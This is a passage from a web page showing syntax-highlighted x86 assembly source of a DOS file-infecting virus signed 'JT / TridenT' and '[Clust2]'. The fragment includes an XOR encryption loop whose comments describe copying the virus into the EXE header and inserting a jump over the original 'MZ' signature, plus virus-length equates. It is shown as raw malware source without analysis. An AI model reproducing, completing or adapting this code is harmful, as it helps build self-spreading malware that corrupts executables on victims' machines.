        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc5">JASS</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc5">TROG</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">CRYPT</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">JUMPER</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">DECRLEN</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">DECR</span><span class="sc0">
</span><span class="sc5">CODEIT</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">                   </span><span class="sc1">; copy virus over 'air' in EXEheader</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">CODEIT</span><span class="sc0">          </span><span class="sc1">; after encrypting</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">07EEBH</span><span class="sc0">        </span><span class="sc1">; insert jmp over original 'MZ'</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">

</span><span class="sc5">NO0</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">ORG13</span><span class="sc0">

        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'[Clust2]'</span><span class="sc0">

</span><span class="sc5">PARAM</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">5CH</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">6CH</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">

        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'JT / TridenT'</span><span class="sc0">

</span><span class="sc5">FILENAME</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">DECRLEN</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">DECR</span><span class="sc0">
</span><span class="sc5">CRYPT</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">DECR</span><span class="sc4">-</span><span class="sc5">JUMPER</span><span class="sc0">
</span><span class="sc5">VIRLEN</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">JUMPER</span><span class="sc0">
</span><span class="sc5">VIRPAR</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">JUMPER</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc0">


</span></div></body>
</html>
